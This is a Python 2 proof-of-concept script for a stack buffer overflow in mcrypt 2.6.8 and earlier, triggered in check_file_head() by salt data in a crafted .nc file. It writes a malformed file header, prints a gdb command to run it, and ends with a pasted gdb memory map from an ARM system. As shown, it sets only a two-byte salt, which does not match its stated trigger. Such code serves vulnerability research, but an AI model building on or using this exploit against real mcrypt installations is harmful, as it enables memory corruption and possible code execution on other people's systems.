#!/usr/bin/env python

# mcrypt version <= 2.6.8 stack BOF poc
# The overflow happens in check_file_head() while it decrypts a .nc files with too long salt data

import sys
from struct import pack

# File header
file_content = "\x00\x6d\x03\x40\x73\x65\x72\x70\x65\x6e\x74\x00\x20\x00\x63\x62"
file_content += "\x63\x00\x6d\x63\x72\x79\x70\x74\x2d\x73\x68\x61\x31\x00"
file_content += chr(2) # Salt size
file_content += 'AAAA'*1 # Padding

try:
  count0 = open("normal.nc", "wb")
  count0.write(file_content)
  count0.close()
except IOError:
  print "file error"
  sys.exit(1)

print "gdb --args src/mcrypt -d normal.nc"

'''
(gdb) info proc mapping
process 26656
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	   0x10000    0x20000    0x10000        0x0 /home/pi/Desktop/hpconarm/exploits/mcrypt-2.6.8/src/mcrypt
	   0x2f000    0x30000     0x1000     0xf000 /home/pi/Desktop/hpconarm/exploits/mcrypt-2.6.8/src/mcrypt
	   0x30000    0x31000     0x1000    0x10000 /home/pi/Desktop/hpconarm/exploits/mcrypt-2.6.8/src/mcrypt
	   0x31000    0x58000    0x27000        0x0 [heap]
	0xf7dfc000 0xf7ee0000    0xe4000        0x0 /lib/arm-linux-gnueabihf/libc-2.28.so
	0xf7ee0000 0xf7ef0000    0x10000    0xe4000 /lib/arm-linux-gnueabihf/libc-2.28.so
	0xf7ef0000 0xf7ef2000     0x2000    0xe4000 /lib/arm-linux-gnueabihf/libc-2.28.so
	0xf7ef2000 0xf7ef3000     0x1000    0xe6000 /lib/arm-linux-gnueabihf/libc-2.28.so
	0xf7ef3000 0xf7ef6000     0x3000        0x0 
	0xf7ef6000 0xf7f1a000    0x24000        0x0 /usr/lib32/libmcrypt.so.4.4.8
	0xf7f1a000 0xf7f29000     0xf000    0x24000 /usr/lib32/libmcrypt.so.4.4.8
	0xf7f29000 0xf7f2a000     0x1000    0x23000 /usr/lib32/libmcrypt.so.4.4.8
	0xf7f2a000 0xf7f2c000     0x2000    0x24000 /usr/lib32/libmcrypt.so.4.4.8
	0xf7f2c000 0xf7f31000     0x5000        0x0 
	0xf7f31000 0xf7f62000    0x31000        0x0 /usr/lib32/arm-linux-gnueabihf/libmhash.so.2.0.1
	0xf7f62000 0xf7f6a000     0x8000    0x31000 /usr/lib32/arm-linux-gnueabihf/libmhash.so.2.0.1
	0xf7f6a000 0xf7f6b000     0x1000    0x31000 /usr/lib32/arm-linux-gnueabihf/libmhash.so.2.0.1
	0xf7f6b000 0xf7f6c000     0x1000    0x32000 /usr/lib32/arm-linux-gnueabihf/libmhash.so.2.0.1
	0xf7f6c000 0xf7f86000    0x1a000        0x0 /lib32/arm-linux-gnueabihf/libz.so.1.2.11
	0xf7f86000 0xf7f95000     0xf000    0x1a000 /lib32/arm-linux-gnueabihf/libz.so.1.2.11
	0xf7f95000 0xf7f96000     0x1000    0x19000 /lib32/arm-linux-gnueabihf/libz.so.1.2.11
	0xf7f96000 0xf7f97000     0x1000    0x1a000 /lib32/arm-linux-gnueabihf/libz.so.1.2.11
	0xf7fc6000 0xf7fde000    0x18000        0x0 /lib/arm-linux-gnueabihf/ld-2.28.so
	0xf7feb000 0xf7fed000     0x2000        0x0 
	0xf7fed000 0xf7fee000     0x1000        0x0 [sigpage]
	0xf7fee000 0xf7fef000     0x1000    0x18000 /lib/arm-linux-gnueabihf/ld-2.28.so
	0xf7fef000 0xf7ff0000     0x1000    0x19000 /lib/arm-linux-gnueabihf/ld-2.28.so
	0xfffcf000 0xffff0000    0x21000        0x0 [stack]
	0xffff0000 0xffff1000     0x1000        0x0 [vectors]

'''